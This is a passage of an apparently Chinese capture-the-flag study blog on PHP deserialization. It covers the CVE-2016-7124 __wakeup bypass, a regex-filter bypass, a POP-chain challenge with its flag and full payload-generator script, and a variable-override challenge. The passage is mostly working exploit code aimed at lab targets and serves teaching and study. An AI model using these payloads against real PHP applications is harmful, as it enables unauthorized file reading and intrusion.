函数的执行。"></a>1.wakeup()魔法函数绕过：PHP反序列化漏洞<code>CVE-2016-7124</code>——当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 __wakeup 函数的执行。</h5><p>如题：</p><p><img src="https://img-blog.csdnimg.cn/20200229173735108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>其实仔细分析代码，只要我们能绕过两点即可得到f15g_1s_here.php的内容</p><p>​    1.绕过正则表达式对变量的检查<br>​    2.绕过_wakeup()魔法函数，因为如果我们反序列化的不是Gu3ss_m3_h2h2.php,这个魔法函数在反序列化时会触发并强制转Gu3ss_m3_h2h2.php</p><p>那么问题就来了，<strong>如何绕过正则表达式/[oc]:\d+:/i，例如：o:4:这样就会被匹配到,而绕过也很简单，只需加上一个+,这个正则表达式即匹配不到0:+4:</strong><br><strong>绕过_wakeup()魔法函数，上面提到了当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 _wakeup 函数的执行</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the f15g_1s_here.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#先创建一个对象，自动调用__construct魔法函数</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Demo(<span class="string">&#x27;f15g_1s_here.php&#x27;</span>);</span><br><span class="line"><span class="comment">#进行序列化</span></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="comment">#使用str_replace() 函数进行替换，来绕过正则表达式的检查</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;O:4:&#x27;</span>,<span class="string">&#x27;O:+4:&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#使用str_replace() 函数进行替换，来绕过__wakeup()魔法函数</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#再进行base64编码</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-test——CVE漏洞："><a href="#2-test——CVE漏洞：" class="headerlink" title="2.test——CVE漏洞："></a>2.test——CVE漏洞：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">man</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$height</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$height</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;height = <span class="variable">$height</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printdata</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hello,this is the test of unserialize&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27; this_is_the_destruct! &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$man</span>= <span class="string">&#x27;O:3:&quot;man&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:5;s:6:&quot;height&quot;;i:20;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$Man</span> = unserialize(<span class="variable">$man</span>);</span><br><span class="line"><span class="comment">// var_dump($Man);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Man</span> == <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$Man</span>-&gt;printdata();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出为：</p><p><img src="/2021/11/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211105171146599.png" alt="image-20211105171146599"></p><p>将其中的一句更改为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$man</span>= <span class="string">&#x27;O:3:&quot;man&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:5;s:6:&quot;height&quot;;i:20;&#125;&#x27;</span>;<span class="comment">//将3-&gt;4，验证转化后unserialize的结果</span></span><br></pre></td></tr></table></figure><p>得到：<img src="/2021/11/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211105172250083.png" alt="image-20211105172250083"></p><p>可以看到<strong>执行了__destruct函数</strong>，说明反序列化了，得到了对象，但是可能不是正常对象，但可以执行对象在销毁时的魔术方法。同时不能执行对应类中的方法和属性值。</p><p>同时看到echo 输出来的结果是  1   ，所以看以看到传入的字符串不能反序列化：<strong>返回false</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function unserialize(string $data [,<span class="built_in"> array </span>$options = []])</span><br><span class="line">从已存储的表示中创建 PHP 的值 unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。</span><br><span class="line"></span><br><span class="line">Returns:</span><br><span class="line"></span><br><span class="line">返回的是转换之后的值，可为 integer、 float、 string、<span class="built_in"> array </span>或 object。 如果传递的字符串不可反序列化，则返回 false ，并产生一个 E_NOTICE</span><br></pre></td></tr></table></figure><p>再看一个：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="literal">false</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出为：<img src="/2021/11/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211105173938151.png" alt="image-20211105173938151"></p><p>即，bool值，为0</p><h4 id="pop链："><a href="#pop链：" class="headerlink" title="pop链："></a>pop链：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//简简单单POP链</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChainSawMan</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$toolMan</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;toolMan=<span class="string">&quot;好耶!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="keyword">$this</span>-&gt;toolMan);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Makima</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$demon</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;demon=<span class="string">&quot;MeatFeast&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;万圣节!万圣节!万圣节!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Power</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$BirthdayCake</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;BirthdayCake=<span class="string">&quot;pwn!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;BirthdayCake)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reze</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ChasingFor</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;girl=<span class="string">&quot;bad&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ChasingFor=<span class="string">&quot;ChainSawMan&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;girl===<span class="string">&quot;dead&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ChasingFor-&gt;heart;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ChasingFor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">[写在前面]</span><br><span class="line">反序列化可以参考</span><br><span class="line">https:<span class="comment">//zhuanlan.zhihu.com/p/102166928</span></span><br><span class="line">解答中可能会出现<span class="string">&quot;类&quot;</span>和<span class="string">&quot;实例&quot;</span>这两个词组的混合使用,</span><br><span class="line">需要注意对于魔术方法来说,<span class="string">&quot;类&quot;</span>和<span class="string">&quot;实例&quot;</span>均能够触发</span><br><span class="line">只是由于出题人表达习惯,所以解答中可能一会说<span class="string">&quot;类&quot;</span>一会说<span class="string">&quot;实例&quot;</span></span><br><span class="line">类只是一个定义好的框架,实例就是其照着框架生成的变量,</span><br><span class="line">在魔术方法的触发上并不会有区别</span><br><span class="line"></span><br><span class="line">pop</span><br><span class="line"></span><br><span class="line">[介绍]</span><br><span class="line">简单的反序列化链,弄清魔术方法之间如何套接就好了,魔法函数可以参考</span><br><span class="line">https:<span class="comment">//blog.csdn.net/inqihoo/article/details/9235103</span></span><br><span class="line">魔术方法实际上就是PHP类中内置的一些特殊方法</span><br><span class="line">这些方法会在特定的条件下被自动触发</span><br><span class="line">[解答]</span><br><span class="line">反序列化的解答实际上就是理清反序列化的链(POP链)是如何一步步实现的,</span><br><span class="line">payload由附录中的PHP脚本生成</span><br><span class="line">(建议对着PHP脚本中对应的类的构造来看解答)</span><br><span class="line">先找反序列化的入口,本题中的入口是</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">再找下最终要实现的代码,在Makima类中的</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;万圣节!万圣节!万圣节!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">所以我们要构造一个POP链从入口开始触发魔术方法直到最终到Makima类中的__invoke魔术方法获取到flag</span><br><span class="line">先来看看入口处能触发哪个魔术方法</span><br><span class="line">__destruct</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);讲传入的参数pop的值转化为对应的类</span><br><span class="line">这个过程在本题中并不能触发其他魔术方法</span><br><span class="line">但是请注意魔术方法__destruct</span><br><span class="line">这个魔术方法会在一个类对应的实例销毁时自动触发</span><br><span class="line">在PHP中脚本执行完成时所有变量(对应的数据)会被销毁,在一个数据没有被变量引用时也会被销毁</span><br><span class="line">本题中unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);虽然执行了反序列化获得了一个类</span><br><span class="line">但这个类并没有被赋值为任意一个变量,所以在反序列化完成后,这个反序列化得到的类被销毁了</span><br><span class="line">所以令反序列化得到的类为ChainSawMan,便能触发它的__destruct魔术方法</span><br><span class="line">执行其中的代码</span><br><span class="line"><span class="keyword">echo</span>(<span class="keyword">$this</span>-&gt;toolMan);</span><br><span class="line">__toString</span><br><span class="line">最终目的是执行到Makima类中的__invoke魔术方法,显然到上面还不够</span><br><span class="line">我们需要接着构造下去,</span><br><span class="line">我们的代码已经构造到了<span class="keyword">echo</span>(<span class="keyword">$this</span>-&gt;toolMan);</span><br><span class="line">而__toString会在一个类被当作字符串使用时触发</span><br><span class="line">如果让<span class="keyword">$this</span>-&gt;toolMan的值为定义了__toString魔术方法的Reze类即可触发</span><br><span class="line">我们便可以执行其中的代码</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;girl===<span class="string">&quot;dead&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ChasingFor-&gt;heart;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ChasingFor;</span><br><span class="line">此处先指明,为了进一步构造下去<span class="keyword">$this</span>-&gt;toolMan赋值的Reze类,</span><br><span class="line">其中的<span class="keyword">$this</span>-&gt;girl其值必须为<span class="string">&quot;dead&quot;</span>来执行</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ChasingFor-&gt;heart;这行代码</span><br><span class="line">__get</span><br><span class="line">运行上述代码是为了能触发Power类中的__get魔术方法</span><br><span class="line">将<span class="keyword">$this</span>-&gt;ChasingFor赋值为Power类的一个实例,这样</span><br><span class="line"><span class="keyword">$this</span>-&gt;ChasingFor-&gt;heart实际上是Power类中的heart属性</span><br><span class="line">但是明显Power类不存在heart属性,这样便能触发__get魔术方法,</span><br><span class="line">执行<span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;BirthdayCake)();</span><br><span class="line">__invoke</span><br><span class="line">魔术方法__invoke是在类被当作函数调用时触发</span><br><span class="line">如果让上面<span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;BirthdayCake)();此处的<span class="keyword">$this</span>-&gt;BirthdayCake赋值为Makima类的实例</span><br><span class="line">这样就相当于去以函数的方式取调用Makima类,</span><br><span class="line">这样就能执行Makima类中的__invoke魔术方法中的代码</span><br><span class="line">也就能获得flag了</span><br><span class="line">[flag]</span><br><span class="line">flag&#123;f1r2_PuNch_t0_mAkIma&#125;</span><br><span class="line"></span><br><span class="line">[附录]</span><br><span class="line">[pop的payload文件]</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChainSawMan</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$toolMan</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;toolMan=<span class="keyword">new</span> Reze();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Makima</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$demon</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;demon=<span class="string">&quot;MeatFeast&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Power</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$BirthdayCake</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;BirthdayCake=<span class="keyword">new</span> Makima();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;BirthdayCake();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reze</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ChasingFor</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;girl=<span class="string">&quot;dead&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ChasingFor=<span class="keyword">new</span> Power();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;girl===<span class="string">&quot;dead&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ChasingFor-&gt;heart;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ChasingFor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ChainSawMan();</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="反序列化变量覆盖："><a href="#反序列化变量覆盖：" class="headerlink" title="反序列化变量覆盖："></a>反序列化变量覆盖：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//注意这里实际上实例化了两个extract类</span></span><br><span class="line"><span class="comment">//所以最终脚本结束销毁变量时会触发两次__dextruct</span></span><br><span class="line"><span class="comment">//如果payload正确你只会看到一句try again而不是两句</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">extract</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;var=<span class="variable">$arg</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key=<span class="string">&quot;this_is_not_a_secret&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key===<span class="string">&quot;this_is_a_secret&quot;</span>)</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;try again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cls</span>=<span class="keyword">new</span> extract(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line"><span class="variable">$serializeStr</span>=str_replace(<span class="string">&#x27;wot&#x27;</span>,<span class="string">&#x27;what&#x27;</span>,serialize(<span class="variable">$cls</span>));</span><br><span class="line"><span class="variable">$newcls</span>=unserialize(<span class="variable">$serializeStr</span>);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="keyword">try</span> againtry again</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 